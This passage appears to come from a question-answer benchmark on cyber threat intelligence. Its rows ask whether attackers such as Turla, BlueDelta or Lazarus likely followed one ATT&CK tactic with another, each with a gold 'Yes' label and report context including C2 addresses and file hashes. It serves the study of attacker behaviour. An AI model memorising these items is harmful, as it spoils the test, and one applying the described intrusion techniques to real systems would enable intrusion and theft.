Exfiltration: The means of exfiltration are not determined, but the data collection functionality of netsat.exe suggests that data for exfiltration might be collected by the 'master' system, indicating the need for either remote or local intruder access to the 'master' system or an exfiltration mechanism in the form of another piece of code.
Others: The Fidelis XPS advanced threat defense system has been updated with rules to detect various components of this malware system. Additional reverse engineering and analysis are ongoing. The malware system's unique functionality and potential for employment against a wide range of targets make it a significant concern for the network security community.",Yes,FTA 1001 FINAL 1.15.14
2380,393,393-Collection-T1119-Automated Collection,"After LightNeuron discovers system network configurations using functions like GetAdaptersInfo and GetComputerName, is it likely to collect emails and local files automatically for eventual exfiltration via its backdoor functions?","Collection: LightNeuron can collect all emails matching specified rules in its configuration, as well as exfiltrate any local file using a backdoor function. This behavior corresponds to MITRE ATT&CK techniques T1114, Email Collection, and T1005, Data from Local System. Additionally, LightNeuron can automatically collect files from a specific path, which is related to MITRE ATT&CK technique T1119, Automated Collection.","Initial Access: Turla, also known as Snake, is believed to have used stolen credentials to deploy LightNeuron, a backdoor specifically designed to target Microsoft Exchange mail servers. This tactic aligns with MITRE ATT&CK technique T1078, Valid Accounts.
Execution: A PowerShell script was utilized to install LightNeuron on the compromised Microsoft Exchange servers, corresponding to MITRE ATT&CK technique T1086, PowerShell.
Privilege Escalation: To obtain administrative rights on the Microsoft Exchange servers, attackers likely used stolen credentials, which is consistent with MITRE ATT&CK technique T1078, Valid Accounts.
Discovery: LightNeuron is capable of executing functions to discover system network configurations, specifically GetAdaptersInfo and GetComputerName, which aligns with MITRE ATT&CK technique T1016, System Network Configuration Discovery.
Command and Control: LightNeuron uses emails for Command and Control (C&C) communication, which is encrypted using AES and aligns with MITRE ATT&CK techniques T1032, Standard Cryptographic Protocol, and T1071, Standard Application Layer Protocol. The C&C data is hidden in PDF documents or JPG images using steganography, which is a form of data obfuscation (MITRE ATT&CK technique T1001).
Exfiltration: Data exfiltration is conducted through the email C&C channel (MITRE ATT&CK technique T1041, Exfiltration Over Command and Control Channel) and can be scheduled to occur during the night or working hours (MITRE ATT&CK technique T1029, Scheduled Transfer). The data is encrypted using AES (MITRE ATT&CK technique T1022, Data Encrypted).",Yes,ESET-LightNeuron
2415,398,398-Defense Evasion-T1202-Indirect Command Execution,"After leveraging control weaknesses in the Windows network to launch lateral movement attacks and compromise the Enterprise Admin account, is it likely that the attackers adopted the tactic of 'living off the land' using tools such as PSExec and plink.exe for defense evasion, before identifying bank employee credentials to manipulate customer debit cards?","Defense Evasion: Attackers adopted the tactic of 'living off the land', using legitimate Windows and PowerShell commands combined with tools such as PSExec for lateral movement, and plink.exe to access RDP over an established SSH tunnel. They also used commercial monitoring applications and 'Cobalt Strike Beacon' to maintain backdoor connections.","Initial Access: The cybercriminal network behind the attack recruited individuals, referred to as 'mules', to open new bank accounts using counterfeit documents likely provided by the network. These mules then requested debit/ATM cards for the new accounts, which were later distributed outside the country for subsequent fraudulent use. The attackers gained initial entry into the bank's network through opportunistic phishing emails to employees, which led to the creation of backdoors on compromised systems. Social engineering techniques were also employed to obtain backdoor access.
Execution: The attackers executed several malicious payloads on the processor's network, including the installation of a legitimate monitoring tool, 'Mipko' (advertised as 'Employee Monitor'), on the processor's Terminal Server. This tool captured full information, including screen captures and keystrokes, for all users who logged into the system and accessed the card management application.
Privilege Escalation: After gaining initial access to the bank's network, the attackers leveraged control weaknesses in the Windows network to launch lateral movement attacks, obtain 'Keys to the Kingdom', and compromise the bank network. They also compromised the Enterprise Admin account on the processor's network, which gave them full access to the infrastructure.
Credential Access: The attackers identified bank employee accounts on the card management application with authorization to request and approve changes to customer debit cards. They used these credentials to manipulate the cards associated with the rogue accounts created earlier.
Lateral Movement: The attackers compromised the third-party processor's network after numerous attempts, leveraging the bank's established connectivity with the processor. They used captured credentials to connect to the processor's network and executed reconnaissance of the card processing service.
Command and Control: The attackers coordinated ATM withdrawals across multiple cities and countries, using command and control with physical mules for coordinated cash outs. They carefully planned the choice of ATM locations based on criteria such as location, degree of physical security, and the ability to dispense substantial amounts of cash.
Impact: The attackers manipulated the bank's internal systems to enable high overdraft levels and removed anti-fraud controls for specific accounts. They then used the manipulated debit cards to perform cash withdrawals from various ATMs, removing up to USD$10 million from each bank. The final stage of the operation took almost five hours to complete, with simultaneous debit card withdrawals across the geographic region.",Yes,TW SpiderLabs Advanced Brief_Post-Soviet Bank Heists_PDF
2441,40,40-Command and Control-T1071-Application Layer Protocol,"After Elise malware collects system information such as IP addresses, installed software, and process enumeration for discovery purposes, is it likely to communicate with the hardcoded C2 server at 103.236.150[.]14 using an application layer protocol for Command and Control?","Command and Control: The malware communicates with a hardcoded C2 server with the IP address 103.236.150[.]14, sending harvested data and receiving files and commands.","Initial Access: The threat group DRAGONFISH, also known as Lotus Blossom, has been distributing a new variant of Elise malware through a malicious Microsoft Word document. The document, which contains information on ADMM-Plus members, embeds a malicious executable file as an OLE object. This file is dropped to the %temp% folder upon opening the document and is executed by exploiting the CVE-2017-11882 vulnerability. The payload is then moved to \AppData\Roaming\Microsoft\Windows\Caches\ as a file named NavShExt.dll, and the original executable is deleted.
Execution: The Elise malware initiates the following sequence of actions: it starts the Internet Explorer process (iexplore.exe) in a suspended state, injects the NavShExt.dll into the process, and calls the DLL's export function named 'Setting'. The process then continues to run in the background. The malware creates a mutex named 'donotbotherme' to prevent duplicate executions and stores harvested data in a file named thumbcache_1CD60.db located in AppData\Local\Microsoft\Windows\Explorer\. It also sends data to and downloads files and commands from a hardcoded C2 server with the IP address 103.236.150[.]14.
Persistence: Persistence is achieved by using the Run Registry key with the value name IAStorD located at HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD. Additionally, two hidden DLLs with export functions named DePatchEntry or EvilEntry are injected into iexplore.exe to provide loading and anti-analysis functionalities.
Defense Evasion: The malware employs various defense evasion techniques, including heavy anti-virtual-machine features, obfuscation techniques to exfiltrate data to the C2 server using base64-encoded cookie values, and spoofing the host to query non-existing domains to mislead malware analysts or network administrators. Debug paths are completely stripped from the malware.
Discovery: The malware harvests extensive system information, including LAN and WAN IP addresses (using ipaddress.com for the latter), installed software list, proxy information, process enumeration via tasklist, and a list of all files on the user's desktop.
Others: iDefense analysts have identified a campaign by the threat group DRAGONFISH targeting the ASEAN Defence Ministers' Meeting (ADMM) and associated individuals for espionage. The malware is capable of providing the attacker with a remote shell on the host and can completely uninstall itself. Execution debug messages are stored in the %temp% folder in a file named FXSAPIDebugLogFile.tmp, and logs are encrypted using a static AES key. To mitigate the threat, security teams are advised to block access to the C2 server and ensure the installation of Microsoft Security Update KB2553204 to patch the CVE-2017-11882 vulnerability. Analysts should look for artifacts such as a value named IAStorD in the autorun key, a file named FXSAPIDebugLogFile.tmp, a mutex handle named donotbotherme, and thumbcache_1CD60.db in AppData\Local\Microsoft\Windows\Explorer\.",Yes,Accenture-Security-Dragonfish-Threat-Analysis
2469,404,404-Credential Access-T1555-Credentials from Password Stores,"After persisting by configuring applications to run batch files every hour for operation continuity, is it likely that the Phantom Menace attackers would use legitimate applications to collect credentials from password stores before uploading these credentials to an external FTP server they controlled?","Credential Access: Legitimate applications were used to collect credentials from local mail clients and Internet browsers, saving them to text files. These credentials were then uploaded to an external FTP server controlled by the attackers.","Initial Access: An email with a seemingly innocuous PDF attachment was sent to Susan, a secretary at Black Gold. The PDF, which passed through all security filters, was actually an executable file disguised as a document, initiating the attack when opened.
Execution: The executable file created a folder and extracted six files, running 'stat.vbs' which in turn executed 'deca.bat'. This batch file opened a blank PDF and ran 'dcp.exe', a file encryption tool, to decrypt two files and extract the contents of 'bare.zip' into a different folder. The 'sai.vbs' script was then executed.
Persistence: The attack modified the Windows registry to ensure 'aagi.bat' ran at system start, and used legitimate applications to collect credentials, renaming them to indicate the time of collection. It also configured an application to run another batch file every hour to maintain its operations.
Defense Evasion: The attack evaded detection by using legitimate tools and scripts without any malicious activity, avoiding behavior-based detectors. It remained undetected for almost six months.
Collection: The attack collected credentials recurrently every hour, resulting in over 80,000 text files with stolen credentials from various firms, all within the oil and gas maritime transportation sector.
Command and Control: The attack used an FTP command to upload stolen credentials to an external server, and the 'iei.bat' file was run every hour to manage the collection and transmission of the data.
Exfiltration: Stolen credentials were exfiltrated to an FTP server, with the oldest files dating back to August 2013, indicating the long-term undetected nature of the attack.
Others: The attack, dubbed 'Phantom Menace', targeted companies in the oil and gas maritime transportation sector. It was linked to a scam involving fake oil deals, where stolen credentials were likely used to forge documents for fraudulent transactions. The attackers appeared to be based in Nigeria, with connections to Ikeja, known as the 'Computer Village'. Despite the evidence, victims were unwilling to report the crime, hindering police investigations. The case highlights the need for companies to perform regular audits and implement new protection strategies for network security.",Yes,oil-tanker-en
2492,407,407-Defense Evasion-T1027-Obfuscated Files or Information,Is it likely that Black Energy 2 will allocate memory in the svchost.exe process and launch the injected library’s code using APC queue processing for persistence after evading defenses by encrypting its payload and loading plugins directly onto the infected machine?,"Defense Evasion: Black Energy 2 evades defenses by hiding its payload using encryption, code compression, and potentially anti-emulation techniques. The malware's plugins are not executable files and are loaded directly onto an infected machine, which means they may not be distributed using mass propagation techniques, making it harder for antivirus vendors to detect new plugins.","Execution: Cybercriminals use Black Energy 2, detected as Backdoor.Win32.Blakken by Kaspersky Lab, to execute malicious activities on infected computers. The malware hides its code from antivirus products using encryption and code compression, and it infects system processes. Upon execution, Black Energy 2 allocates virtual memory, copies its decryptor code, and passes control to the decryptor, which then places dropper functionality code in memory. A decryptor driver with a random name is created in the system32drivers directory, and a corresponding service is started. The driver acts as a wrapper for the malware's core components.
Persistence: Black Energy 2 maintains persistence by injecting a DLL into the svchost.exe user-mode process. The infector driver, which contains the malicious DLL, locates the svchost.exe process, allocates memory in its address space, and launches the injected library's code using APC queue processing.
Command and Control: The botnet's command-and-control (C&C) center communicates with Black Energy 2 through HTTP requests. The bot sends a preformed HTTP request containing data that identifies the infected machine. The C&C responds with a bot configuration file, which is an encrypted XML document. The bot can receive general commands from the C&C, such as downloading and executing files, updating the bot, and setting contact frequency with the C&C server.
Impact: Black Energy 2 is primarily used to conduct DDoS attacks. It uses plugins like ddos, syn, and http to initiate mass connections and send random data packets to target servers. The malware can create a significant load on servers, especially when using the http plugin, which imitates an ordinary user visiting a page multiple times in a short period.
Others: Kaspersky Lab has identified over 4,000 modifications of Black Energy 2 since mid-2008. The malware has evolved to include plugins that extend its capabilities beyond DDoS attacks, potentially allowing for spam distribution, credential grabbing, and proxy server setup. Kaspersky Lab continues to monitor the evolution of Black Energy 2 and its plugins to track the threat's progression.",Yes,black-ddos
2518,45,45-Discovery-T1082-System Information Discovery,"After exploiting the Roundcube webmail software vulnerabilities to gain credential access by dumping OS credentials, including /etc/passwd and /etc/shadow files, is the BlueDelta campaign likely to perform system information discovery by exploiting vulnerabilities in Roundcube webmail software before utilizing Roundcube’s managesieve plugin to collect emails by auto-forwarding them to an actor-controlled email address?","Discovery: The BlueDelta campaign conducted discovery activities by exploiting vulnerabilities in Roundcube webmail software to gather system information, network configuration, owner/user discovery, and network connections discovery.","Reconnaissance: The BlueDelta campaign involved reconnaissance activities targeting Ukrainian government entities and an organization involved in Ukrainian military aircraft infrastructure upgrade and refurbishment. The campaign exploited vulnerabilities CVE-2020-35730, CVE-2020-12641, and CVE-2021-44026 in Roundcube webmail software to run reconnaissance and exfiltration scripts. These scripts were designed to redirect incoming emails to an actor-controlled email address, perform reconnaissance on the target Roundcube server, and exfiltrate the victim's Roundcube session cookie and address book, along with session and user information from Roundcube's database.
Initial Access: The BlueDelta campaign gained initial access by exploiting the Ukrainian government's Roundcube mail servers using CVE-2020-35730. This was achieved without the need for recipients to engage with the email attachment. The campaign also exploited the Microsoft Outlook zero-day vulnerability CVE-2023-23397 in 2022, which did not require user interaction and was triggered once the vulnerable Outlook client received the malicious email.
Execution: The BlueDelta campaign executed malicious scripts through the exploitation of vulnerabilities in Roundcube webmail software. The scripts redirected victims' future incoming emails to an actor-controlled email address and performed reconnaissance on the target Roundcube server. Additionally, the campaign exploited CVE-2023-23397 in Microsoft Outlook, allowing attackers to authenticate to other services by impersonating a victim.
Defense Evasion: BlueDelta used obfuscation techniques to avoid detection. The campaign involved the use of obfuscated JavaScript files and the deobfuscation of these files to execute the attack. The attackers also used encoded data to communicate with the compromised systems and avoid detection by security mechanisms.
Credential Access: BlueDelta accessed credentials by exploiting the Roundcube webmail software vulnerabilities to dump OS credentials, including /etc/passwd and /etc/shadow files, from the compromised systems.
Collection: BlueDelta collected emails by creating a filter within Roundcube's managesieve plugin, which automatically forwarded all emails received by the victim to a specified email address controlled by the attackers.
Command and Control: The BlueDelta campaign used web protocols for command and control activities, including the use of standard encoding to communicate with the compromised systems.
Exfiltration: BlueDelta exfiltrated data over alternative protocols and automated the exfiltration process. The campaign involved the exfiltration of the victim's Roundcube session cookie, address book, and database information.",Yes,BlueDelta Exploits Ukrainian Government Roundcube Mail Servers to Support Espionage Activities
2519,45,45-Discovery-T1016-System Network Configuration Discovery,Is it likely that the BlueDelta campaign exploited the Ukrainian government's Roundcube mail servers using CVE-2020-35730 for initial access before exploiting vulnerabilities in Roundcube webmail software to conduct discovery activities focused on gathering information such as system and network configurations?,"Discovery: The BlueDelta campaign conducted discovery activities by exploiting vulnerabilities in Roundcube webmail software to gather system information, network configuration, owner/user discovery, and network connections discovery.","Reconnaissance: The BlueDelta campaign involved reconnaissance activities targeting Ukrainian government entities and an organization involved in Ukrainian military aircraft infrastructure upgrade and refurbishment. The campaign exploited vulnerabilities CVE-2020-35730, CVE-2020-12641, and CVE-2021-44026 in Roundcube webmail software to run reconnaissance and exfiltration scripts. These scripts were designed to redirect incoming emails to an actor-controlled email address, perform reconnaissance on the target Roundcube server, and exfiltrate the victim's Roundcube session cookie and address book, along with session and user information from Roundcube's database.
Initial Access: The BlueDelta campaign gained initial access by exploiting the Ukrainian government's Roundcube mail servers using CVE-2020-35730. This was achieved without the need for recipients to engage with the email attachment. The campaign also exploited the Microsoft Outlook zero-day vulnerability CVE-2023-23397 in 2022, which did not require user interaction and was triggered once the vulnerable Outlook client received the malicious email.
Execution: The BlueDelta campaign executed malicious scripts through the exploitation of vulnerabilities in Roundcube webmail software. The scripts redirected victims' future incoming emails to an actor-controlled email address and performed reconnaissance on the target Roundcube server. Additionally, the campaign exploited CVE-2023-23397 in Microsoft Outlook, allowing attackers to authenticate to other services by impersonating a victim.
Defense Evasion: BlueDelta used obfuscation techniques to avoid detection. The campaign involved the use of obfuscated JavaScript files and the deobfuscation of these files to execute the attack. The attackers also used encoded data to communicate with the compromised systems and avoid detection by security mechanisms.
Credential Access: BlueDelta accessed credentials by exploiting the Roundcube webmail software vulnerabilities to dump OS credentials, including /etc/passwd and /etc/shadow files, from the compromised systems.
Collection: BlueDelta collected emails by creating a filter within Roundcube's managesieve plugin, which automatically forwarded all emails received by the victim to a specified email address controlled by the attackers.
Command and Control: The BlueDelta campaign used web protocols for command and control activities, including the use of standard encoding to communicate with the compromised systems.
Exfiltration: BlueDelta exfiltrated data over alternative protocols and automated the exfiltration process. The campaign involved the exfiltration of the victim's Roundcube session cookie, address book, and database information.",Yes,BlueDelta Exploits Ukrainian Government Roundcube Mail Servers to Support Espionage Activities
2520,45,45-Discovery-T1033-System Owner/User Discovery,"After gaining credential access by exploiting the Roundcube webmail software vulnerabilities to dump OS credentials such as /etc/passwd and /etc/shadow files, is it likely that the BlueDelta campaign will exploit vulnerabilities in Roundcube webmail software to conduct discovery activities for system information, network configuration, and user discovery before collecting emails by creating a filter within Roundcube's managesieve plugin?","Discovery: The BlueDelta campaign conducted discovery activities by exploiting vulnerabilities in Roundcube webmail software to gather system information, network configuration, owner/user discovery, and network connections discovery.","Reconnaissance: The BlueDelta campaign involved reconnaissance activities targeting Ukrainian government entities and an organization involved in Ukrainian military aircraft infrastructure upgrade and refurbishment. The campaign exploited vulnerabilities CVE-2020-35730, CVE-2020-12641, and CVE-2021-44026 in Roundcube webmail software to run reconnaissance and exfiltration scripts. These scripts were designed to redirect incoming emails to an actor-controlled email address, perform reconnaissance on the target Roundcube server, and exfiltrate the victim's Roundcube session cookie and address book, along with session and user information from Roundcube's database.
Initial Access: The BlueDelta campaign gained initial access by exploiting the Ukrainian government's Roundcube mail servers using CVE-2020-35730. This was achieved without the need for recipients to engage with the email attachment. The campaign also exploited the Microsoft Outlook zero-day vulnerability CVE-2023-23397 in 2022, which did not require user interaction and was triggered once the vulnerable Outlook client received the malicious email.
Execution: The BlueDelta campaign executed malicious scripts through the exploitation of vulnerabilities in Roundcube webmail software. The scripts redirected victims' future incoming emails to an actor-controlled email address and performed reconnaissance on the target Roundcube server. Additionally, the campaign exploited CVE-2023-23397 in Microsoft Outlook, allowing attackers to authenticate to other services by impersonating a victim.
Defense Evasion: BlueDelta used obfuscation techniques to avoid detection. The campaign involved the use of obfuscated JavaScript files and the deobfuscation of these files to execute the attack. The attackers also used encoded data to communicate with the compromised systems and avoid detection by security mechanisms.
Credential Access: BlueDelta accessed credentials by exploiting the Roundcube webmail software vulnerabilities to dump OS credentials, including /etc/passwd and /etc/shadow files, from the compromised systems.
Collection: BlueDelta collected emails by creating a filter within Roundcube's managesieve plugin, which automatically forwarded all emails received by the victim to a specified email address controlled by the attackers.
Command and Control: The BlueDelta campaign used web protocols for command and control activities, including the use of standard encoding to communicate with the compromised systems.
Exfiltration: BlueDelta exfiltrated data over alternative protocols and automated the exfiltration process. The campaign involved the exfiltration of the victim's Roundcube session cookie, address book, and database information.",Yes,BlueDelta Exploits Ukrainian Government Roundcube Mail Servers to Support Espionage Activities
2561,50,50-Discovery-T1518-Software Discovery,"After The Outlaw group uses the Shellbot to maintain persistent communication with C&C servers via IRC, is it likely that the malware will gather information about the infected host, such as processor details and installed monitoring tools, before establishing and maintaining the IRC channel for receiving commands and orchestrating operations?","Discovery: The Shellbot gathers information about the infected host, such as the number of processor cores, type of processor, and whether monitoring tools like Splunk or antivirus solutions are installed.","Initial Access: The Outlaw hacking group, using the Perl-based Shellbot, compromised an FTP server of a Japanese art institution and a Bangladeshi government site by exploiting a vulnerability on Dovecot mail server. They then linked two compromised servers to a high availability cluster to host an IRC bouncer for command and control.
Execution: The Shellbot, written in Perl, is distributed by exploiting a command injection vulnerability on IoT devices and Linux servers. It can also affect Windows environments and Android devices. The botnet was previously spread via the Shellshock vulnerability but now is mostly distributed via brute-forced or compromised hosts.
Persistence: Once installed, the Shellbot communicates persistently with the C&C servers via IRC. Restarting the infected machine does not revert the changes done to the system.
Defense Evasion: The Shellbot assigns hardcoded process names to hide from system admins, security monitoring, and researchers. It also uses PING/PONG communication to keep the IRC channel open and avoid disconnection.
Command and Control: The Shellbot establishes C&C communication immediately after infection and maintains it. The IRC channel is used to send various commands to the host, including commands for port scanning, DDoS attacks, file downloads, and obtaining information about other machines.
Others: The Outlaw group's operation involves targeting organizations for cybercriminal purposes using DoS and SSH brute force attacks. The group operates mostly during business hours, suggesting a daily operation schedule. Security measures recommended include proper SSH setup, CLI command monitoring, non-DNS traffic monitoring, account creation detection, FTP usage restriction, Dovecot mail server vulnerability patching, and maintaining contact for security compromise reporting. Trend Micro's XGen security provides protection against such threats.",Yes,Perl-Based Shellbot Looks to Target Organizations via C&C - TrendLabs Security Intelligence Blog
2565,51,51-Defense Evasion-T1562-Impair Defenses,"After achieving persistence by creating registry keys to store a unique GUID for the compromised host and hijacking legitimate services, is it likely that Emissary Trojan authors will update the Trojan to evade detection by recompiling it without changing the PE header hashes?","Defense Evasion: Emissary Trojan authors have made several updates to the malware to evade detection. These updates include changes in configuration storage, handling of commands, and the introduction of large file sizes to avoid antivirus scanning. The actors also recompiled the Trojan without changes to avoid detection based on PE header hashes.","Initial Access: The CTI report indicates that the threat actors behind the Emissary Trojan, associated with Operation Lotus Blossom, shifted their tactics from solely using spear-phishing with attachments to also compromising legitimate websites to host their malware. This shift in tactics suggests an adaptation to increase the odds of successful infiltration.
Persistence: The Emissary Trojan is capable of maintaining persistence on a targeted system. It achieves this by writing itself to %SYSTEM%\WSPsvc.dll and installing as a service to run the exported function 'ServiceMain'. Additionally, it creates registry keys to store encrypted configuration and a unique GUID for the compromised host. Persistence is also achieved through various methods such as hijacking legitimate services or adding startup code, depending on the user's permissions.
Command and Control: The Emissary Trojan communicates with command and control (C2) servers using HTTP requests. It typically has three hardcoded C2s that are a mix of IPs and domain names. The C2 infrastructure used by Emissary is somewhat different from that used by the related Elise Trojan. The report includes a full list of Indicators of Compromise (IOCs) related to the C2 infrastructure.
Others: The CTI report details the evolution of the Emissary Trojan, which has been in use since 2009 and is related to the Elise Trojan and Operation Lotus Blossom campaign. The report provides a timeline of the development efforts and changes made to the Emissary Trojan over the years, including the creation of multiple versions with iterative changes. The report also notes that the development effort for Emissary significantly increased after the publication of the Operation Lotus Blossom report in June 2015, resulting in many new versions of the Trojan. Additionally, the report includes a changelog section discussing the observed changes between each version of Emissary, highlighting the malware's capability to exfiltrate files, download and execute additional payloads, and gain remote shell access. The report concludes that the actors behind Emissary have been active for at least seven years, targeting primarily military or government entities in Southeast Asia, with a focus on Taiwan and Hong Kong. The report also includes a list of Emissary delivery documents, installers/loaders, DLL versions, C2 URLs, and campaign codes.",Yes,emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve
2573,53,53-Initial Access-T1566-Phishing,"After using MS-DOS obfuscated code in a .lnk file to execute a PowerShell script for carving out a base64 encoded script and orchestrating further activities, is it likely that malware would have initially been sent to email accounts through suspicious emails appearing to originate from a Vietnam government domain before being delivered via a zip file attachment containing .lnk files simulating document icons?","Initial Access: A malware was sent to email accounts belonging to a Vietnam government domain on March 13th, 2019. The email, written in Vietnamese, appeared to originate from an internal account (gov.vn) and was flagged as suspicious. The malware was delivered via a zip file attachment that contained a .lnk file simulating a document icon, a technique known to be used by attackers but not widely popular.","Execution: The .lnk file's target property contained MS-DOS obfuscated code that, when executed, would carve out a base64 encoded PowerShell script named s.ps1 and save it in the %TEMP% directory. This PowerShell script was designed to execute another PowerShell script in memory, which would then run a WScript Shell. The WScript Shell created three files: a decoy DOC file, a legitimate tool for installing .NET assembled files to bypass SmartScreen and AppLocker protection, and a .NET DLL file containing the actual malicious payload.
Persistence: The PowerShell script checked for administrative privileges and copied the DLL file to WINDIR\debug\ or %TEMP% accordingly. It then created a scheduled task with SYSTEM privileges if the user was an administrator, or with lower privileges otherwise. The malware also checked for the presence of Kaspersky antivirus and adjusted its behavior accordingly, either running a VBS script or renaming it to TXT and executing it with wbscript /E:vbscript.
Defense Evasion: The malware employed a technique using InstallUtil.exe, a legitimate .NET tool, to avoid detection by Smartscreen and Applocker. The DLL was 'uninstalled' using InstallUtil.exe with the '/u' command, which paradoxically installed the malware. The .DAT file generated by the script was a DLL file compiled with .NET that contained the payload and was injected into memory.
Command and Control: The payload was identified as a Cobalt Strike beacon, evident from its communication pattern with the command and control server.
Others: The attack targeted the Vietnamese government using a combination of sophisticated techniques. The use of a .LNK file helped evade sandboxes, and the obfuscation techniques kept the malware under the radar. The execution technique allowed the malware to evade Endpoint Detection and Response (EDR) systems by loading through a legitimate binary and working in memory for deobfuscation and injection. The infrastructure used in this attack was not associated with any other known attacks. Indicators of Compromise (IOCs) include the IP address 144.202.54.86, hashes 0476ec8b4cb1b5dd368be52d9249f5b3cf6709b3141e9d02814c05f61cb90a91, 89fdef30c14db09e4e82c561db4a35cbc039b95bdfa6340546f7ee54b887f59b, 52dc9be06e921276c9df828b6be6da994df667e25af03bdddcc6cfec1470f1d7, and the mutex GLOBAL_VMSytnSCg.",Yes,Docless Vietnam APT
2574,53,53-Execution-T1059-Command and Scripting Interpreter,"After gaining initial access by sending a malware-laden zip file with a .lnk file attachment to Vietnam government email accounts, is it likely that the execution process involves the .lnk file containing MS-DOS obfuscated code that carves out and executes a base64 encoded PowerShell script before the WScript Shell creates and utilizes specific files such as a decoy DOC file, a legitimate tool, and a .NET DLL file?","Execution: The .lnk file's target property contained MS-DOS obfuscated code that, when executed, would carve out a base64 encoded PowerShell script named s.ps1 and save it in the %TEMP% directory. This PowerShell script was designed to execute another PowerShell script in memory, which would then run a WScript Shell. The WScript Shell created three files: a decoy DOC file, a legitimate tool for installing .NET assembled files to bypass SmartScreen and AppLocker protection, and a .NET DLL file containing the actual malicious payload.","Initial Access: A malware was sent to email accounts belonging to a Vietnam government domain on March 13th, 2019. The email, written in Vietnamese, appeared to originate from an internal account (gov.vn) and was flagged as suspicious. The malware was delivered via a zip file attachment that contained a .lnk file simulating a document icon, a technique known to be used by attackers but not widely popular.
Persistence: The PowerShell script checked for administrative privileges and copied the DLL file to WINDIR\debug\ or %TEMP% accordingly. It then created a scheduled task with SYSTEM privileges if the user was an administrator, or with lower privileges otherwise. The malware also checked for the presence of Kaspersky antivirus and adjusted its behavior accordingly, either running a VBS script or renaming it to TXT and executing it with wbscript /E:vbscript.
Defense Evasion: The malware employed a technique using InstallUtil.exe, a legitimate .NET tool, to avoid detection by Smartscreen and Applocker. The DLL was 'uninstalled' using InstallUtil.exe with the '/u' command, which paradoxically installed the malware. The .DAT file generated by the script was a DLL file compiled with .NET that contained the payload and was injected into memory.
Command and Control: The payload was identified as a Cobalt Strike beacon, evident from its communication pattern with the command and control server.
Others: The attack targeted the Vietnamese government using a combination of sophisticated techniques. The use of a .LNK file helped evade sandboxes, and the obfuscation techniques kept the malware under the radar. The execution technique allowed the malware to evade Endpoint Detection and Response (EDR) systems by loading through a legitimate binary and working in memory for deobfuscation and injection. The infrastructure used in this attack was not associated with any other known attacks. Indicators of Compromise (IOCs) include the IP address 144.202.54.86, hashes 0476ec8b4cb1b5dd368be52d9249f5b3cf6709b3141e9d02814c05f61cb90a91, 89fdef30c14db09e4e82c561db4a35cbc039b95bdfa6340546f7ee54b887f59b, 52dc9be06e921276c9df828b6be6da994df667e25af03bdddcc6cfec1470f1d7, and the mutex GLOBAL_VMSytnSCg.",Yes,Docless Vietnam APT
2585,54,54-Discovery-T1033-System Owner/User Discovery,"After gaining initial access through malicious JavaScript files downloaded from compromised domains via the Polish Financial Supervision Authority's website, is it likely that the malware will execute commands to gather system information before sending the results back to the C&C servers identified by their IP addresses?","Discovery: The malware executes a series of commands to gather system information, including hostname, user information, system version, network configuration, active TCP connections, and more. The results are sent back to the C&C, eye-watch[.]in.","Initial Access: On 3rd February 2017, researchers at badcyber.com reported a series of attacks targeting Polish financial institutions, suspected to originate from the Polish Financial Supervision Authority's website (knf.gov[.]pl). The website code had been altered from at least 2016-10-07 to late January to download malicious JavaScript files from compromised domains sap.misapor[.]ch and eye-watch[.]in, leading to malware downloads on visitors' devices.
Execution: The malware, identified by the MD5 hash 85d316590edfb4212049c4490db08c4b and named gpsvc.exe, is a Win32 executable first seen on 2017-01-26. It is packed with 'Enigma Protector' and drops a known Lazarus group malware variant. The executable accepts command line arguments to list service names, open or set events, and drop/install DLLs under specified service names using an RC4 password derived from the provided password's MD5 hash.
Defense Evasion: The malware uses a commercial packer known as 'Enigma Protector' for defense evasion. Additionally, the malware executes a series of basic system information gathering commands and returns the results via the C&C, eye-watch[.]in, which may also serve as a defense evasion technique by mimicking normal system queries.
Command and Control: The C&C servers for the malware are identified by the IP addresses 125.214.195.17 and 196.29.166.218. The malware communicates with the C&C using a beacon with the User-Agent resembling a Firefox browser on Windows.
Others: Additional watering-hole attacks were observed on the Comisi\u00f3n Nacional Bancaria y de Valores (Mexico) and a state-owned bank in Uruguay. The eye-watch[.]in domain was used in these attacks and has been associated with other malicious activities, including the delivery of malware variants and a Silverlight exploit based on CVE-2016-0034. A list of 255 IP address strings was found in the exploit kit website code, likely used to filter traffic and deliver exploits only to specific subnets, primarily targeting financial institutions in Poland and Mexico.",Yes,lazarus-watering-hole-attacks.html
2586,54,54-Discovery-T1082-System Information Discovery,"After leveraging a commercial packer like 'Enigma Protector' for defense evasion, is it likely that the malware will execute commands to gather system information and subsequently send the results back to the C&C servers identified by the IP addresses 125.214.195.17 and 196.29.166.218?","Discovery: The malware executes a series of commands to gather system information, including hostname, user information, system version, network configuration, active TCP connections, and more. The results are sent back to the C&C, eye-watch[.]in.","Initial Access: On 3rd February 2017, researchers at badcyber.com reported a series of attacks targeting Polish financial institutions, suspected to originate from the Polish Financial Supervision Authority's website (knf.gov[.]pl). The website code had been altered from at least 2016-10-07 to late January to download malicious JavaScript files from compromised domains sap.misapor[.]ch and eye-watch[.]in, leading to malware downloads on visitors' devices.
Execution: The malware, identified by the MD5 hash 85d316590edfb4212049c4490db08c4b and named gpsvc.exe, is a Win32 executable first seen on 2017-01-26. It is packed with 'Enigma Protector' and drops a known Lazarus group malware variant. The executable accepts command line arguments to list service names, open or set events, and drop/install DLLs under specified service names using an RC4 password derived from the provided password's MD5 hash.
Defense Evasion: The malware uses a commercial packer known as 'Enigma Protector' for defense evasion. Additionally, the malware executes a series of basic system information gathering commands and returns the results via the C&C, eye-watch[.]in, which may also serve as a defense evasion technique by mimicking normal system queries.
Command and Control: The C&C servers for the malware are identified by the IP addresses 125.214.195.17 and 196.29.166.218. The malware communicates with the C&C using a beacon with the User-Agent resembling a Firefox browser on Windows.
Others: Additional watering-hole attacks were observed on the Comisi\u00f3n Nacional Bancaria y de Valores (Mexico) and a state-owned bank in Uruguay. The eye-watch[.]in domain was used in these attacks and has been associated with other malicious activities, including the delivery of malware variants and a Silverlight exploit based on CVE-2016-0034. A list of 255 IP address strings was found in the exploit kit website code, likely used to filter traffic and deliver exploits only to specific subnets, primarily targeting financial institutions in Poland and Mexico.",Yes,lazarus-watering-hole-attacks.html
